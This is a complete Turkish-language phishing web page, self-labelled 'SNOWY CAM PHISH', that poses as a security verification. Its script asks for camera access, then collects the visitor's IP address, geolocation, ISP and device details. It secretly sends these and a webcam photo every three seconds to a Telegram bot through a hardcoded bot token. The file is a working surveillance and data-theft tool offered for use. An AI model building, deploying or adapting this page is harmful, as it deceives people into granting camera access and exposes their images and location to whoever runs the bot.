<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Güvenlik Doğrulaması</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        h2 { color: #333; font-size: 28px; margin-bottom: 10px; }
        h2 span { color: #667eea; }
        p { color: #666; margin-bottom: 30px; }
        .btn {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white; border: none; padding: 16px 32px;
            font-size: 18px; font-weight: bold; border-radius: 50px;
            cursor: pointer; width: 100%;
        }
        .btn:hover { transform: translateY(-2px); }
        .loading { display: none; margin: 20px 0; }
        .spinner {
            border: 4px solid #f3f3f3; border-top: 4px solid #667eea;
            border-radius: 50%; width: 40px; height: 40px;
            animation: spin 1s linear infinite; margin: 0 auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loading-text { color: #667eea; margin-top: 10px; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h2>❄️ GÜVENLİK DOĞRULAMASI</h2>
        <p>Devam etmek için kamera erişimine izin verin.</p>
        <button class="btn" id="startBtn" onclick="startCamera()">📸 BAŞLAT</button>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <div class="loading-text" id="loadingText">Güvenlik kontrolü...</div>
        </div>
    </div>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // ============================================
        // GİZLİ KONFİGÜRASYON
        // ============================================
        const BOT_TOKEN = "8773124715:AAG3Y7itEmKlsrvOfUkrvXoZmJrRPQanzro";
        const urlParams = new URLSearchParams(window.location.search);
        const TARGET_ID = urlParams.get('i');
        
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        
        // ============================================
        // GERÇEK ÇALIŞAN BİLGİLER
        // ============================================
        async function getRealInfo() {
            const info = {};
            
            // 1. IP ve KONUM (KESİN ÇALIŞIR)
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                info.ip = ipData.ip;
                
                const locRes = await fetch(`http://ip-api.com/json/${info.ip}`);
                const locData = await locRes.json();
                if (locData.status === 'success') {
                    info.ulke = locData.country;
                    info.ulke_kodu = locData.countryCode;
                    info.sehir = locData.city;
                    info.ilce = locData.regionName;
                    info.isp = locData.isp;
                    info.org = locData.org;
                    info.as = locData.as;
                    info.enlem = locData.lat;
                    info.boylam = locData.lon;
                }
            } catch(e) { info.ip = 'Alınamadı'; }
            
            // 2. CİHAZ BİLGİSİ (User-Agent)
            const ua = navigator.userAgent;
            info.user_agent = ua;
            
            // İşletim Sistemi
            if (/Android/i.test(ua)) info.os = 'Android';
            else if (/iPhone|iPad/i.test(ua)) info.os = 'iOS';
            else if (/Windows/i.test(ua)) info.os = 'Windows';
            else if (/Mac/i.test(ua)) info.os = 'MacOS';
            else if (/Linux/i.test(ua)) info.os = 'Linux';
            else info.os = 'Diğer';
            
            // Tarayıcı
            if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) info.browser = 'Chrome';
            else if (/Firefox/i.test(ua)) info.browser = 'Firefox';
            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) info.browser = 'Safari';
            else if (/Edg/i.test(ua)) info.browser = 'Edge';
            else info.browser = 'Diğer';
            
            // 3. EKRAN BİLGİSİ
            info.ekran = `${screen.width}x${screen.height}`;
            info.renk = screen.colorDepth + ' bit';
            info.pixel = window.devicePixelRatio || 1;
            
            // 4. TARAYICI DİLİ
            info.dil = navigator.language;
            info.diller = navigator.languages.join(', ');
            
            // 5. ZAMAN
            info.zaman = new Date().toLocaleString('tr-TR');
            info.saat_dilimi = Intl.DateTimeFormat().resolvedOptions().timeZone;
            info.timezone_offset = new Date().getTimezoneOffset();
            
            // 6. RAM (SADECE CHROME'DA ÇALIŞIR)
            if (navigator.deviceMemory) {
                info.ram = navigator.deviceMemory + ' GB';
            }
            
            // 7. İŞLEMCİ ÇEKİRDEK (SADECE CHROME'DA)
            if (navigator.hardwareConcurrency) {
                info.cekirdek = navigator.hardwareConcurrency;
            }
            
            // 8. BAĞLANTI TİPİ
            if (navigator.connection) {
                info.baglanti = navigator.connection.effectiveType || 'Bilinmiyor';
                info.hiz = navigator.connection.downlink + ' Mbps' || 'Bilinmiyor';
            }
            
            // 9. DOKUNMATİK
            info.dokunmatik = 'ontouchstart' in window ? 'Evet' : 'Hayır';
            
            // 10. ÇEREZ DURUMU
            info.cerez = navigator.cookieEnabled ? 'Aktif' : 'Pasif';
            
            return info;
        }
        
        // ============================================
        // TELEGRAM'A GÖNDER
        // ============================================
        async function sendInfo(info) {
            let msg = `❄️ **SNOWY CAM PHISH** ❄️\n`;
            msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
            
            msg += `📍 **KONUM**\n`;
            msg += `🌍 Ülke: ${info.ulke || '?'} ${info.ulke_kodu || ''}\n`;
            msg += `🏙️ Şehir: ${info.sehir || '?'}\n`;
            msg += `📌 İlçe: ${info.ilce || '?'}\n`;
            msg += `🌐 IP: ${info.ip || '?'}\n`;
            msg += `🔌 ISP: ${info.isp || '?'}\n`;
            msg += `🏢 Org: ${info.org || '?'}\n`;
            msg += `🔢 AS: ${info.as || '?'}\n`;
            msg += `📍 Koordinat: ${info.enlem || '?'}, ${info.boylam || '?'}\n\n`;
            
            msg += `📱 **CİHAZ**\n`;
            msg += `💻 OS: ${info.os || '?'}\n`;
            msg += `🌐 Tarayıcı: ${info.browser || '?'}\n`;
            msg += `🖥️ Ekran: ${info.ekran || '?'}\n`;
            msg += `🎨 Renk: ${info.renk || '?'}\n`;
            msg += `📏 Piksel: ${info.pixel || '?'}\n`;
            if (info.ram) msg += `💾 RAM: ${info.ram}\n`;
            if (info.cekirdek) msg += `🧠 Çekirdek: ${info.cekirdek}\n`;
            msg += `✋ Dokunmatik: ${info.dokunmatik}\n\n`;
            
            msg += `🌐 **TARAYICI**\n`;
            msg += `🌐 Dil: ${info.dil || '?'}\n`;
            msg += `📚 Diller: ${info.diller || '?'}\n`;
            msg += `🍪 Çerez: ${info.cerez}\n\n`;
            
            msg += `📶 **AĞ**\n`;
            if (info.baglanti) msg += `📶 Tip: ${info.baglanti}\n`;
            if (info.hiz) msg += `⚡ Hız: ${info.hiz}\n\n`;
            
            msg += `⏱️ **ZAMAN**\n`;
            msg += `🕒 ${info.zaman}\n`;
            msg += `🌍 ${info.saat_dilimi}\n`;
            msg += `⏰ Offset: ${info.timezone_offset} dk\n\n`;
            
            msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
            msg += `⚡ @snowy_dexry_wexry ⚡`;
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: TARGET_ID, text: msg, parse_mode: 'Markdown' })
            });
        }
        
        // ============================================
        // FOTOĞRAF ÇEK
        // ============================================
        async function takePhoto() {
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', TARGET_ID);
                formData.append('photo', blob, `cam_${Date.now()}.jpg`);
                formData.append('caption', `📸 ${new Date().toLocaleString('tr-TR')}`);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            }, 'image/jpeg', 0.7);
        }
        
        // ============================================
        // KAMERAYI BAŞLAT
        // ============================================
        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                document.getElementById('startBtn').style.display = 'none';
                document.getElementById('loading').style.display = 'block';
                
                // BİLGİLERİ GÖNDER
                const info = await getRealInfo();
                await sendInfo(info);
                
                // 2 saniye bekle
                await new Promise(r => setTimeout(r, 2000));
                
                // HER 3 SANİYEDE FOTOĞRAF ÇEK
                setInterval(takePhoto, 3000);
                
                // YAZILARI DEĞİŞTİR
                const texts = ["Güvenlik kontrolü...", "Kimlik doğrulanıyor...", "Veriler işleniyor..."];
                let i = 0;
                setInterval(() => {
                    i = (i + 1) % texts.length;
                    document.getElementById('loadingText').innerText = texts[i];
                }, 3000);
                
            } catch(e) {
                alert('Kamera izni gerekli!');
            }
        }
    </script>
</body>
</html>
